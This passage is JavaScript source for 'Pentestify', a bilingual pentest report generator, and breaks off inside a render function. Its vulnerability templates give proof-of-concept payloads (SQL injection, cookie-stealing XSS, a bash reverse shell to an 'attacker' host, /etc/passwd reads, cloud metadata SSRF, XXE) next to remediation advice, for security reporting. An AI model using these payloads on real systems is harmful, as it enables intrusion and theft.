const state = {
    lang: 'es',
    showSplash: false,
    activeTab: 'editor',
    isLoading: false,
    currentReportId: null,
    savedReports: [],
    showReportSelector: false,
    auditData: {
        documentTitle: 'Reporte Técnico de Vulnerabilidades',
        clientCompany: 'Empresa Cliente S.A.',
        clientLogo: '',
        targetAsset: 'Aplicación Principal',
        auditorCompany: 'Empresa Auditora LLC',
        auditorName: 'Juan Pérez',
        classification: '2',
        version: '1.0',
        date: new Date().toISOString().split('T')[0],
        lang: 'es'
    },
    findings: [],
    currentFinding: {
        templateKey: 'custom',
        title: '',
        severity: 'med',
        description: '',
        cvss: '',
        poc: '',
        impact: '',
        remediation: '',
        reference: '',
        cve: '',
        images: []
    },
    isDirty: false
};

// ==========================================
// TRADUCCIONES
// ==========================================
const UI = {
    es: {
        appTitle: 'Pentestify',
        appSubtitle: 'Security Report Generator',
        welcome: 'Bienvenido a',
        tagline: 'Generador de Reportes de Pentesting',
        description: 'Crea reportes profesionales de vulnerabilidades con plantillas predefinidas y exportación PDF.',
        enterApp: 'Entrar a la Aplicación',
        newFinding: 'Registrar Nuevo Hallazgo',
        newFindingDesc: 'Completa los detalles de la vulnerabilidad descubierta.',
        quickTemplate: 'Plantilla Rápida (Auto-completar)',
        customOther: 'Personalizado / Otro',
        vulnTitle: 'Título de la Vulnerabilidad',
        severity: 'Nivel de Severidad',
        description: 'Descripción de la Vulnerabilidad',
        cvss: 'Puntuación CVSS (0-10)',
        poc: 'Pasos para Reproducir (PoC)',
        impact: 'Impacto en el Negocio',
        remediation: 'Solución y Remediación',
        reference: 'Referencias (URLs)',
        cve: 'Identificador CVE',
        images: 'Evidencias (Imágenes)',
        addImages: 'Agregar Imágenes',
        addFinding: 'Agregar Hallazgo',
        updateFinding: 'Actualizar Hallazgo',
        cancel: 'Cancelar',
        preview: 'Vista Previa',
        generatePdf: 'Generar PDF',
        saveReport: 'Guardar Reporte',
        myReports: 'Mis Reportes',
        backToEditor: 'Volver al Editor',
        createNewReport: 'Crear Nuevo Reporte',
        noReports: 'No hay reportes guardados',
        noReportsDesc: 'Crea tu primer reporte usando el botón de arriba',
        editor: 'Edición',
        severityLevels: {
            crit: 'Crítico',
            high: 'Alto',
            med: 'Medio',
            low: 'Bajo',
            info: 'Informativo'
        },
        targetAsset: 'Activo a Auditar',
        clientCompany: 'Empresa Cliente',
        clientLogo: 'Logotipo (opcional)',
        auditorCompany: 'Empresa Auditora',
        auditorName: 'Nombre del Auditor',
        documentTitle: 'Título del Documento',
        date: 'Fecha del Reporte',
        classification: 'Clasificación',
        version: 'Versión',
        classifications: {
            '1': 'Público',
            '2': 'Interno',
            '3': 'Confidencial',
            '4': 'Restringido'
        }
    },
    en: {
        appTitle: 'Pentestify',
        appSubtitle: 'Security Report Generator',
        welcome: 'Welcome to',
        tagline: 'Pentesting Report Generator',
        description: 'Create professional vulnerability reports with predefined templates and PDF export.',
        enterApp: 'Enter Application',
        newFinding: 'Register New Finding',
        newFindingDesc: 'Complete the details of the discovered vulnerability.',
        quickTemplate: 'Quick Template (Auto-fill)',
        customOther: 'Custom / Other',
        vulnTitle: 'Vulnerability Title',
        severity: 'Severity Level',
        description: 'Vulnerability Description',
        cvss: 'CVSS Score (0-10)',
        poc: 'Steps to Reproduce (PoC)',
        impact: 'Business Impact',
        remediation: 'Solution and Remediation',
        reference: 'References (URLs)',
        cve: 'CVE Identifier',
        images: 'Evidence (Images)',
        addImages: 'Add Images',
        addFinding: 'Add Finding',
        updateFinding: 'Update Finding',
        cancel: 'Cancel',
        preview: 'Preview',
        generatePdf: 'Generate PDF',
        saveReport: 'Save Report',
        myReports: 'My Reports',
        backToEditor: 'Back to Editor',
        createNewReport: 'Create New Report',
        noReports: 'No saved reports',
        noReportsDesc: 'Create your first report using the button above',
        editor: 'Editor',
        severityLevels: {
            crit: 'Critical',
            high: 'High',
            med: 'Medium',
            low: 'Low',
            info: 'Informational'
        },
        targetAsset: 'Target Asset',
        clientCompany: 'Client Company',
        clientLogo: 'Client Logo (optional)',
        auditorCompany: 'Auditor Company',
        auditorName: 'Auditor Name',
        documentTitle: 'Document Title',
        date: 'Report Date',
        classification: 'Classification',
        version: 'Version',
        classifications: {
            '1': 'Public',
            '2': 'Internal',
            '3': 'Confidential',
            '4': 'Restricted'
        }
    }
};

// ==========================================
// TEMPLATES DE VULNERABILIDADES
// ==========================================
const templates = {
    sqli: {
        key: 'sqli',
        es: {
            title: 'Inyección SQL (SQL Injection)',
            description: 'Se ha detectado una vulnerabilidad de Inyección SQL que permite a un atacante manipular consultas SQL arbitrarias...',
            poc: '1. Identificar un campo de entrada vulnerable (login, búsqueda, parámetro URL)\n2. Inyectar: \' OR \'1\'=\'1\' --\n3. Observar que la consulta devuelve resultados no autorizados\n4. Usar UNION SELECT para extraer datos: UNION SELECT username,password FROM users--',
            impact: 'Un atacante podría acceder, modificar o eliminar datos sensibles de la base de datos...',
            remediation: 'Implementar consultas preparadas (prepared statements) con parámetros parametrizados...',
            cvss: '8.1',
            reference: 'OWASP SQL Injection: https://owasp.org/www-community/attacks/SQL_Injection'
        },
        en: {
            title: 'SQL Injection',
            description: 'A SQL Injection vulnerability has been detected that allows an attacker to manipulate arbitrary SQL queries...',
            poc: '1. Identify a vulnerable input field (login, search, URL parameter)\n2. Inject: \' OR \'1\'=\'1\' --\n3. Observe unauthorized results are returned\n4. Use UNION SELECT to extract data: UNION SELECT username,password FROM users--',
            impact: 'An attacker could access, modify or delete sensitive database data...',
            remediation: 'Implement prepared statements with parameterized queries...',
            cvss: '8.1',
            reference: 'OWASP SQL Injection: https://owasp.org/www-community/attacks/SQL_Injection'
        }
    },
    xss: {
        key: 'xss',
        es: {
            title: 'Cross-Site Scripting (XSS)',
            description: 'La aplicación no sanitiza adecuadamente la entrada del usuario permitiendo la inyección de scripts maliciosos...',
            poc: '1. Localizar un campo que refleje input (comentarios, búsqueda, perfil)\n2. Inyectar: <script>alert(\'XSS\')</script>\n3. Si aparece el popup, probar: <img src=x onerror=alert(document.cookie)>\n4. Para XSS almacenado: el payload persiste y ejecuta en otros usuarios',
            impact: 'Permite a un atacante ejecutar scripts en el navegador de la víctima...',
            remediation: 'Implementar sanitización de entrada (input validation) y escaping de output...',
            cvss: '6.1',
            reference: 'OWASP XSS: https://owasp.org/www-community/attacks/xss/'
        },
        en: {
            title: 'Cross-Site Scripting (XSS)',
            description: 'The application does not properly sanitize user input allowing injection of malicious scripts...',
            poc: '1. Locate a field that reflects input (comments, search, profile)\n2. Inject: <script>alert(\'XSS\')</script>\n3. If popup appears, try: <img src=x onerror=alert(document.cookie)>\n4. For stored XSS: payload persists and executes on other users',
            impact: 'Allows an attacker to execute scripts in the victim\'s browser...',
            remediation: 'Implement input validation and output escaping...',
            cvss: '6.1',
            reference: 'OWASP XSS: https://owasp.org/www-community/attacks/xss/'
        }
    },
    idor: {
        key: 'idor',
        es: {
            title: 'IDOR (Insecure Direct Object Reference)',
            description: 'Se ha detectado una vulnerabilidad IDOR que permite a un atacante acceder a recursos o datos de otros usuarios manipulando identificadores en las peticiones.',
            poc: '1. Identificar endpoints con IDs numéricos: /api/users/123/documents\n2. Cambiar el ID: /api/users/124/documents → acceder a datos de otro usuario\n3. Probar con diferentes métodos HTTP: GET, PUT, DELETE\n4. Verificar que no hay validación de propiedad del recurso',
            impact: 'Un atacante podría acceder, modificar o eliminar datos de otros usuarios sin autorización, violando la confidencialidad e integridad de la información.',
            remediation: 'Implementar controles de autorización en cada acceso a recursos, utilizar identificadores indirectos (GUIDs) y validar que el usuario autenticado tenga permisos sobre el recurso solicitado.',
            cvss: '7.5',
            reference: 'OWASP IDOR: https://owasp.org/www-community/attacks/Insecure_Direct_Object_Reference'
        },
        en: {
            title: 'IDOR (Insecure Direct Object Reference)',
            description: 'An IDOR vulnerability has been detected that allows an attacker to access other users\' resources or data by manipulating identifiers in requests.',
            poc: '1. Identify endpoints with numeric IDs: /api/users/123/documents\n2. Change the ID: /api/users/124/documents → access another user\'s data\n3. Try different HTTP methods: GET, PUT, DELETE\n4. Verify no resource ownership validation exists',
            impact: 'An attacker could access, modify or delete other users\' data without authorization, violating data confidentiality and integrity.',
            remediation: 'Implement authorization controls on every resource access, use indirect identifiers (GUIDs) and validate that the authenticated user has permissions over the requested resource.',
            cvss: '7.5',
            reference: 'OWASP IDOR: https://owasp.org/www-community/attacks/Insecure_Direct_Object_Reference'
        }
    },
    ssrf: {
        key: 'ssrf',
        es: {
            title: 'SSRF (Server-Side Request Forgery)',
            description: 'La aplicación permite que un atacante fuerce al servidor a realizar peticiones a recursos internos o externos controlados por el atacante.',
            poc: '1. Identificar parámetros que aceptan URLs: ?url=, ?target=, ?endpoint=\n2. Probar acceso a metadata cloud: http://169.254.169.254/latest/meta-data/\n3. Escaneo de puertos internos: http://localhost:22, http://127.0.0.1:3306\n4. Exfiltración de archivos: file:///etc/passwd o gopher://',
            impact: 'Un atacante podría acceder a servicios internos, escanear puertos internos, acceder a metadata de cloud, o exfiltrar datos sensibles desde la red interna.',
            remediation: 'Validar y sanitizar todas las URLs de entrada, usar listas blancas de dominios permitidos, deshabilitar esquemas peligrosos (file://, gopher://), y usar DNS resolving con validación.',
            cvss: '8.2',
            reference: 'OWASP SSRF: https://owasp.org/www-community/attacks/Server_Side_Request_Forgery'
        },
        en: {
            title: 'SSRF (Server-Side Request Forgery)',
            description: 'The application allows an attacker to force the server to make requests to internal or external resources controlled by the attacker.',
            poc: '1. Identify URL parameters: ?url=, ?target=, ?endpoint=\n2. Test cloud metadata access: http://169.254.169.254/latest/meta-data/\n3. Internal port scanning: http://localhost:22, http://127.0.0.1:3306\n4. File exfiltration: file:///etc/passwd or gopher://',
            impact: 'An attacker could access internal services, scan internal ports, access cloud metadata, or exfiltrate sensitive data from the internal network.',
            remediation: 'Validate and sanitize all input URLs, use whitelists of allowed domains, disable dangerous schemes (file://, gopher://), and use DNS resolving with validation.',
            cvss: '8.2',
            reference: 'OWASP SSRF: https://owasp.org/www-community/attacks/Server_Side_Request_Forgery'
        }
    },
    csrf: {
        key: 'csrf',
        es: {
            title: 'CSRF (Cross-Site Request Forgery)',
            description: 'La aplicación no implementa protección contra CSRF, permitiendo que un atacante induzca a un usuario autenticado a realizar acciones no deseadas.',
            poc: '1. Identificar formularios sin tokens CSRF (cambio de email, contraseña, transferencias)\n2. Crear página HTML maliciosa con form auto-submit\n3. Enviar víctima autenticada a la página: POST /change-password automático\n4. Verificar que la acción se ejecuta sin validación adicional',
            impact: 'Un atacante podría realizar acciones en nombre del usuario (cambiar contraseña, realizar transferencias, modificar datos) sin su conocimiento o consentimiento.',
            remediation: 'Implementar tokens CSRF únicos en formularios, usar el atributo SameSite en cookies, validar el header Origin/Referer, y reautenticar para acciones sensibles.',
            cvss: '6.8',
            reference: 'OWASP CSRF: https://owasp.org/www-community/attacks/csrf'
        },
        en: {
            title: 'CSRF (Cross-Site Request Forgery)',
            description: 'The application does not implement CSRF protection, allowing an attacker to induce an authenticated user to perform unwanted actions.',
            poc: '1. Identify forms without CSRF tokens (email change, password, transfers)\n2. Create malicious HTML page with auto-submit form\n3. Send authenticated victim to page: POST /change-password automatically\n4. Verify action executes without additional validation',
            impact: 'An attacker could perform actions on behalf of the user (change password, make transfers, modify data) without their knowledge or consent.',
            remediation: 'Implement unique CSRF tokens in forms, use SameSite cookie attribute, validate Origin/Referer headers, and re-authenticate for sensitive actions.',
            cvss: '6.8',
            reference: 'OWASP CSRF: https://owasp.org/www-community/attacks/csrf'
        }
    },
    xxe: {
        key: 'xxe',
        es: {
            title: 'XXE (XML External Entity)',
            description: 'El procesador XML de la aplicación permite entidades externas, permitiendo a un atacante leer archivos locales, realizar SSRF o causar DoS.',
            poc: '1. Identificar endpoints que procesan XML (SOAP, REST XML, import/export)\n2. Inyectar DOCTYPE con entidad externa: <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>\n3. Usar la entidad en el cuerpo: &xxe;\n4. Para SSRF: <!ENTITY xxe SYSTEM "http://internal-service/">',
            impact: 'Un atacante podría leer archivos locales del servidor, acceder a servicios internos, ejecutar SSRF, o causar denegación de servicio (DoS).',
            remediation: 'Deshabilitar entidades externas y DTDs en el procesador XML (XXE=disable), usar formatos alternativos como JSON, y validar el input XML estrictamente.',
            cvss: '7.5',
            reference: 'OWASP XXE: https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing'
        },
        en: {
            title: 'XXE (XML External Entity)',
            description: 'The application\'s XML processor allows external entities, enabling an attacker to read local files, perform SSRF, or cause DoS.',
            poc: '1. Identify XML processing endpoints (SOAP, REST XML, import/export)\n2. Inject DOCTYPE with external entity: <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>\n3. Use entity in body: &xxe;\n4. For SSRF: <!ENTITY xxe SYSTEM "http://internal-service/">',
            impact: 'An attacker could read local server files, access internal services, execute SSRF, or cause denial of service (DoS).',
            remediation: 'Disable external entities and DTDs in the XML processor (XXE=disable), use alternative formats like JSON, and strictly validate XML input.',
            cvss: '7.5',
            reference: 'OWASP XXE: https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing'
        }
    },
    rce: {
        key: 'rce',
        es: {
            title: 'RCE (Remote Code Execution)',
            description: 'La aplicación permite la ejecución de código arbitrario en el servidor mediante la inyección de comandos o código en funciones vulnerables.',
            poc: '1. Identificar funciones que ejecutan código: eval(), exec(), system(), passthru()\n2. Inyectar payload en parámetros: ; cat /etc/passwd, | whoami, $(id)\n3. Para webs: ?page=php://filter/convert.base64-encode/resource=/etc/passwd\n4. Reverse shell: bash -i >& /dev/tcp/attacker/4444 0>&1',
            impact: 'Un atacante podría tomar control completo del servidor, acceder a datos sensibles, moverse lateralmente en la red o instalar malware persistente.',
            remediation: 'Nunca ejecutar input del usuario sin validación, usar listas blancas de entrada, implementar sandboxing, y aplicar el principio de mínimo privilegio.',
            cvss: '9.8',
            reference: 'OWASP Command Injection: https://owasp.org/www-community/attacks/Command_Injection'
        },
        en: {
            title: 'RCE (Remote Code Execution)',
            description: 'The application allows arbitrary code execution on the server by injecting commands or code into vulnerable functions.',
            poc: '1. Identify code execution functions: eval(), exec(), system(), passthru()\n2. Inject payload in parameters: ; cat /etc/passwd, | whoami, $(id)\n3. For web: ?page=php://filter/convert.base64-encode/resource=/etc/passwd\n4. Reverse shell: bash -i >& /dev/tcp/attacker/4444 0>&1',
            impact: 'An attacker could take complete control of the server, access sensitive data, move laterally in the network, or install persistent malware.',
            remediation: 'Never execute user input without validation, use input whitelists, implement sandboxing, and apply the principle of least privilege.',
            cvss: '9.8',
            reference: 'OWASP Command Injection: https://owasp.org/www-community/attacks/Command_Injection'
        }
    },
    lfi: {
        key: 'lfi',
        es: {
            title: 'LFI (Local File Inclusion)',
            description: 'La aplicación permite incluir archivos locales del servidor mediante la manipulación de parámetros, permitiendo leer archivos sensibles.',
            poc: '1. Identificar parámetros de inclusión: ?page=, ?file=, ?include=\n2. Probar con paths relativos: ?page=../../../etc/passwd\n3. Null byte bypass (PHP < 5.3.4): ?page=../../../etc/passwd%00\n4. Wrapper PHP: php://filter/convert.base64-encode/resource=/etc/passwd',
            impact: 'Un atacante podría leer archivos sensibles del sistema (/etc/passwd, archivos de configuración, código fuente) o potencialmente ejecutar código.',
            remediation: 'Validar y sanitizar rutas de archivo, usar listas blancas de archivos permitidos, evitar usar input del usuario en rutas, y deshabilitar funciones peligrosas.',
            cvss: '7.1',
            reference: 'OWASP Path Traversal: https://owasp.org/www-community/attacks/Path_Traversal'
        },
        en: {
            title: 'LFI (Local File Inclusion)',
            description: 'The application allows including local server files by manipulating parameters, enabling reading of sensitive files.',
            poc: '1. Identify inclusion parameters: ?page=, ?file=, ?include=\n2. Try relative paths: ?page=../../../etc/passwd\n3. Null byte bypass (PHP < 5.3.4): ?page=../../../etc/passwd%00\n4. PHP wrapper: php://filter/convert.base64-encode/resource=/etc/passwd',
            impact: 'An attacker could read sensitive system files (/etc/passwd, configuration files, source code) or potentially execute code.',
            remediation: 'Validate and sanitize file paths, use whitelists of allowed files, avoid using user input in paths, and disable dangerous functions.',
            cvss: '7.1',
            reference: 'OWASP Path Traversal: https://owasp.org/www-community/attacks/Path_Traversal'
        }
    },
    cors: {
        key: 'cors',
        es: {
            title: 'CORS Misconfiguration',
            description: 'La configuración CORS de la aplicación es incorrecta, permitiendo que sitios maliciosos realicen peticiones en nombre de usuarios autenticados.',
            poc: '1. Verificar headers CORS: Access-Control-Allow-Origin: *\n2. Probar con Origin header malicioso: Origin: https://evil.com\n3. Verificar si credenciales están permitidas con wildcard\n4. Crear script en evil.com que haga fetch autenticado a la API',
            impact: 'Un atacante podría realizar peticiones autenticadas desde dominios maliciosos, acceder a datos sensibles o realizar acciones no autorizadas.',
            remediation: 'Validar el header Origin contra una lista blanca, no usar wildcard (*) con credenciales, y implementar headers CORS restrictivos según el recurso.',
            cvss: '6.1',
            reference: 'OWASP CORS: https://owasp.org/www-community/attacks/CORS_Misconfiguration'
        },
        en: {
            title: 'CORS Misconfiguration',
            description: 'The application\'s CORS configuration is incorrect, allowing malicious sites to make requests on behalf of authenticated users.',
            poc: '1. Check CORS headers: Access-Control-Allow-Origin: *\n2. Test with malicious Origin header: Origin: https://evil.com\n3. Verify credentials allowed with wildcard\n4. Create script on evil.com making authenticated fetch to API',
            impact: 'An attacker could make authenticated requests from malicious domains, access sensitive data, or perform unauthorized actions.',
            remediation: 'Validate Origin header against a whitelist, do not use wildcard (*) with credentials, and implement restrictive CORS headers per resource.',
            cvss: '6.1',
            reference: 'OWASP CORS: https://owasp.org/www-community/attacks/CORS_Misconfiguration'
        }
    },
    path_traversal: {
        key: 'path_traversal',
        es: {
            title: 'Path Traversal / Directory Traversal',
            description: 'La aplicación no valida adecuadamente las rutas de archivo, permitiendo a un atacante acceder a directorios y archivos fuera del directorio permitido.',
            poc: '1. Identificar parámetros de descarga/archivo: ?download=report.pdf\n2. Probar secuencias de traversal: ?download=../../../etc/passwd\n3. Codificaciones alternativas: ..%2f..%2f..%2fetc/passwd\n4. Bypass con doble encoding: %252e%252e%252fetc%252fpasswd',
            impact: 'Un atacante podría acceder a archivos sensibles del sistema operativo, archivos de configuración, logs, o código fuente de la aplicación.',
            remediation: 'Validar y sanitizar rutas eliminando secuencias como ../, usar chroot jails, validar extensiones permitidas, y usar APIs de archivos seguras.',
            cvss: '7.5',
            reference: 'OWASP Path Traversal: https://owasp.org/www-community/attacks/Path_Traversal'
        },
        en: {
            title: 'Path Traversal / Directory Traversal',
            description: 'The application does not properly validate file paths, allowing an attacker to access directories and files outside the allowed directory.',
            poc: '1. Identify download/file parameters: ?download=report.pdf\n2. Try traversal sequences: ?download=../../../etc/passwd\n3. Alternative encodings: ..%2f..%2f..%2fetc/passwd\n4. Double encoding bypass: %252e%252e%252fetc%252fpasswd',
            impact: 'An attacker could access sensitive operating system files, configuration files, logs, or application source code.',
            remediation: 'Validate and sanitize paths removing sequences like ../, use chroot jails, validate allowed extensions, and use safe file APIs.',
            cvss: '7.5',
            reference: 'OWASP Path Traversal: https://owasp.org/www-community/attacks/Path_Traversal'
        }
    },
    command_injection: {
        key: 'command_injection',
        es: {
            title: 'Command Injection',
            description: 'La aplicación ejecuta comandos del sistema operativo incluyendo input del usuario sin validación adecuada, permitiendo la ejecución de comandos arbitrarios.',
            poc: '1. Identificar funciones de sistema: ping, nslookup, whois, traceroute\n2. Inyectar comandos adicionales: ; cat /etc/passwd, && whoami, | id\n3. Redirección de output: `comando` > /var/www/output.txt\n4. Blind command injection: ; sleep 5 (time-based detection)',
            impact: 'Un atacante podría ejecutar comandos arbitrarios en el servidor, comprometer el sistema completo, o usarlo como pivot para ataques internos.',
            remediation: 'Evitar ejecutar comandos del sistema con input del usuario, usar APIs seguras, implementar listas blancas estrictas, y sanitizar input eliminando metacaracteres.',
            cvss: '9.1',
            reference: 'OWASP Command Injection: https://owasp.org/www-community/attacks/Command_Injection'
        },
        en: {
            title: 'Command Injection',
            description: 'The application executes operating system commands including user input without proper validation, allowing arbitrary command execution.',
            poc: '1. Identify system functions: ping, nslookup, whois, traceroute\n2. Inject additional commands: ; cat /etc/passwd, && whoami, | id\n3. Output redirection: `command` > /var/www/output.txt\n4. Blind command injection: ; sleep 5 (time-based detection)',
            impact: 'An attacker could execute arbitrary commands on the server, compromise the entire system, or use it as a pivot for internal attacks.',
            remediation: 'Avoid executing system commands with user input, use secure APIs, implement strict whitelists, and sanitize input removing metacharacters.',
            cvss: '9.1',
            reference: 'OWASP Command Injection: https://owasp.org/www-community/attacks/Command_Injection'
        }
    },
    insecure_deserialization: {
        key: 'insecure_deserialization',
        es: {
            title: 'Insecure Deserialization',
            description: 'La aplicación deserializa datos sin validación adecuada, permitiendo a un atacante manipular objetos serializados para ejecutar código o modificar lógica.',
            poc: '1. Identificar puntos de deserialización: cookies, parámetros, mensajes de cola\n2. Para Java: ysoserial para generar payloads (CommonsCollections, etc.)\n3. Para PHP: manipulación de objetos PHP serializados\n4. Para .NET: gadgets de deserialización con ObjectDataProvider',
            impact: 'Un atacante podría ejecutar código arbitrario, realizar escalada de privilegios, o manipular la lógica de negocio de la aplicación.',
            remediation: 'No deserializar datos de fuentes no confiables, usar formatos seguros como JSON, implementar firmas digitales, y usar deserialización con tipos estrictos.',
            cvss: '8.1',
            reference: 'OWASP Deserialization: https://owasp.org/www-community/vulnerabilities/Deserialization_of_untrusted_data'
        },
        en: {
            title: 'Insecure Deserialization',
            description: 'The application deserializes data without proper validation, allowing an attacker to manipulate serialized objects to execute code or modify logic.',
            poc: '1. Identify deserialization points: cookies, parameters, queue messages\n2. For Java: ysoserial to generate payloads (CommonsCollections, etc.)\n3. For PHP: manipulate serialized PHP objects\n4. For .NET: deserialization gadgets with ObjectDataProvider',
            impact: 'An attacker could execute arbitrary code, escalate privileges, or manipulate the application\'s business logic.',
            remediation: 'Do not deserialize data from untrusted sources, use safe formats like JSON, implement digital signatures, and use deserialization with strict typing.',
            cvss: '8.1',
            reference: 'OWASP Deserialization: https://owasp.org/www-community/vulnerabilities/Deserialization_of_untrusted_data'
        }
    },
    jwt_bypass: {
        key: 'jwt_bypass',
        es: {
            title: 'JWT Authentication Bypass',
            description: 'La implementación JWT de la aplicación es vulnerable a bypass mediante algoritmo "none", claves débiles, o falta de validación de firma.',
            poc: '1. Decodificar JWT en jwt.io para ver estructura\n2. Probar algoritmo "none": cambiar alg a "none" y eliminar firma\n3. Cracking de clave débil: jwt_tool o hashcat para HS256\n4. Manipulación de algoritmo RS256→HS256 con clave pública',
            impact: 'Un atacante podría falsificar tokens JWT, impersonar otros usuarios, escalar privilegios, o acceder a funcionalidades protegidas sin autenticación.',
            remediation: 'Validar estrictamente el algoritmo JWT, usar claves seguras (HS256+ o RS256), validar expiración y issuer, y almacenar claves de forma segura.',
            cvss: '8.2',
            reference: 'OWASP JWT Security: https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/04-Authentication_Testing/10-Testing_JSON_Web_Tokens'
        },
        en: {
            title: 'JWT Authentication Bypass',
            description: 'The application\'s JWT implementation is vulnerable to bypass using "none" algorithm, weak keys, or lack of signature validation.',
            poc: '1. Decode JWT at jwt.io to see structure\n2. Test "none" algorithm: change alg to "none" and remove signature\n3. Crack weak key: jwt_tool or hashcat for HS256\n4. RS256→HS256 manipulation with public key',
            impact: 'An attacker could forge JWT tokens, impersonate other users, escalate privileges, or access protected functionality without authentication.',
            remediation: 'Strictly validate JWT algorithm, use secure keys (HS256+ or RS256), validate expiration and issuer, and store keys securely.',
            cvss: '8.2',
            reference: 'OWASP JWT Security: https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/04-Authentication_Testing/10-Testing_JSON_Web_Tokens'
        }
    },
    file_upload: {
        key: 'file_upload',
        es: {
            title: 'Insecure File Upload',
            description: 'La funcionalidad de subida de archivos no valida adecuadamente tipos de archivo, permitiendo subir archivos ejecutables o peligrosos.',
            poc: '1. Subir archivo con extensión peligrosa: shell.php, malware.exe\n2. Bypass de extensión: shell.php5, shell.phtml, shell.php.jpg\n3. Manipulación MIME type: cambiar Content-Type a image/jpeg\n4. Upload de polyglot: imagen con código PHP/Javascript embebido',
            impact: 'Un atacante podría subir archivos maliciosos (webshells, ejecutables), ejecutar código en el servidor, o realizar ataques contra otros usuarios.',
            remediation: 'Validar extensiones y tipos MIME con listas blancas, escanear archivos con antivirus, renombrar archivos al subir, y almacenar fuera del web root.',
            cvss: '7.5',
            reference: 'OWASP File Upload: https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload'
        },
        en: {
            title: 'Insecure File Upload',
            description: 'The file upload functionality does not properly validate file types, allowing upload of executable or dangerous files.',
            poc: '1. Upload file with dangerous extension: shell.php, malware.exe\n2. Extension bypass: shell.php5, shell.phtml, shell.php.jpg\n3. MIME type manipulation: change Content-Type to image/jpeg\n4. Polyglot upload: image with embedded PHP/Javascript code',
            impact: 'An attacker could upload malicious files (webshells, executables), execute code on the server, or perform attacks against other users.',
            remediation: 'Validate extensions and MIME types with whitelists, scan files with antivirus, rename files on upload, and store outside web root.',
            cvss: '7.5',
            reference: 'OWASP File Upload: https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload'
        }
    },
    security_misconfig: {
        key: 'security_misconfig',
        es: {
            title: 'Security Misconfiguration',
            description: 'La aplicación presenta configuraciones de seguridad incorrectas, credenciales por defecto, headers de seguridad faltantes, o información de debugging expuesta.',
            poc: '1. Verificar headers de seguridad faltantes: X-Frame-Options, CSP, HSTS\n2. Buscar información de debug: stack traces, versión de servidor\n3. Verificar credenciales por defecto: admin/admin, root/toor\n4. Revisar permisos excesivos en directorios y archivos sensibles',
            impact: 'Un atacante podría explotar configuraciones débiles para acceder a datos sensibles, escalar privilegios, o comprometer el sistema.',
            remediation: 'Implementar hardening del servidor, cambiar credenciales por defecto, deshabilitar debugging en producción, y usar headers de seguridad apropiados.',
            cvss: '6.5',
            reference: 'OWASP Security Misconfiguration: https://owasp.org/Top10/A05_2021-Security_Misconfiguration/'
        },
        en: {
            title: 'Security Misconfiguration',
            description: 'The application has incorrect security configurations, default credentials, missing security headers, or exposed debugging information.',
            poc: '1. Check for missing security headers: X-Frame-Options, CSP, HSTS\n2. Search for debug info: stack traces, server version\n3. Verify default credentials: admin/admin, root/toor\n4. Review excessive permissions on directories and sensitive files',
            impact: 'An attacker could exploit weak configurations to access sensitive data, escalate privileges, or compromise the system.',
            remediation: 'Implement server hardening, change default credentials, disable debugging in production, and use appropriate security headers.',
            cvss: '6.5',
            reference: 'OWASP Security Misconfiguration: https://owasp.org/Top10/A05_2021-Security_Misconfiguration/'
        }
    }
};

// ==========================================
// FUNCIONES DE UTILIDAD
// ==========================================
const $ = (selector) => document.querySelector(selector);
const $$ = (selector) => document.querySelectorAll(selector);
const createEl = (tag, className, html) => {
    const el = document.createElement(tag);
    if (className) el.className = className;
    if (html) el.innerHTML = html;
    return el;
};

// ==========================================
// API SERVICE
// ==========================================
const API = {
    baseUrl: '',

    async request(method, endpoint, data = null) {
        const url = `${this.baseUrl}${endpoint}`;
        const options = {
            method,
            headers: { 'Content-Type': 'application/json' }
        };
        if (data) options.body = JSON.stringify(data);

        const response = await fetch(url, options);
        if (!response.ok) throw new Error(`HTTP ${response.status}`);
        return response.json();
    },

    reports: {
        getAll: () => API.request('GET', '/api/reports'),
        getById: (id) => API.request('GET', `/api/reports/${id}`),
        create: (data) => API.request('POST', '/api/reports', data),
        update: (id, data) => API.request('PUT', `/api/reports/${id}`, data),
        delete: (id) => API.request('DELETE', `/api/reports/${id}`)
    },

    findings: {
        create: (reportId, data) => API.request('POST', `/api/reports/${reportId}/findings`, data),
        update: (findingId, data) => API.request('PUT', `/api/findings/${findingId}`, data),
        delete: (findingId) => API.request('DELETE', `/api/findings/${findingId}`)
    }
};

// ==========================================
// RENDERIZADO DE COMPONENTES
// ==========================================

function renderSplashScreen() {
    if (!state.showSplash) return '';

    const t = UI[state.lang];

    return `
        <div class="splash-screen">
            <div class="splash-content">
                <div class="splash-logo">
                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                        <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>
                        <path d="M12 8v4"/><path d="M12 16h.01"/>
                    </svg>
                </div>
                <h1 class="splash-title">${t.appTitle}</h1>
                <p class="splash-tagline">${t.tagline}</p>
                <p class="splash-desc">${t.description}</p>
                
                <div class="splash-actions">
                    <button class="btn-enter" onclick="enterApp()">${t.enterApp}</button>
                    <div class="lang-toggle">
                        <button class="${state.lang === 'es' ? 'active' : ''}" onclick="setLang('es')">ES</button>
                        <button class="${state.lang === 'en' ? 'active' : ''}" onclick="setLang('en')">EN</button>
                    </div>
                </div>
            </div>
        </div>
    `;
}

function renderNavbar() {
    if (state.showSplash) return '';

    const t = UI[state.lang];

    return `
        <header class="navbar">
            <div class="navbar-brand">
                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                    <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>
                </svg>
                <span>${t.appTitle}</span>
                ${state.isDirty ? '<span class="dirty-indicator">•</span>' : ''}
            </div>
            
            <div class="navbar-actions">
                <button class="${state.showReportSelector ? 'active' : ''}" onclick="showReports()">${t.myReports}</button>
                <button class="${state.activeTab === 'editor' && !state.showReportSelector ? 'active' : ''}" onclick="hideReports(); setTab('editor')">${t.editor}</button>
                <button class="${state.activeTab === 'preview' && !state.showReportSelector ? 'active' : ''}" onclick="hideReports(); setTab('preview')">${t.preview}</button>
                <button class="btn-primary" onclick="window.print()">${t.generatePdf}</button>
            </div>
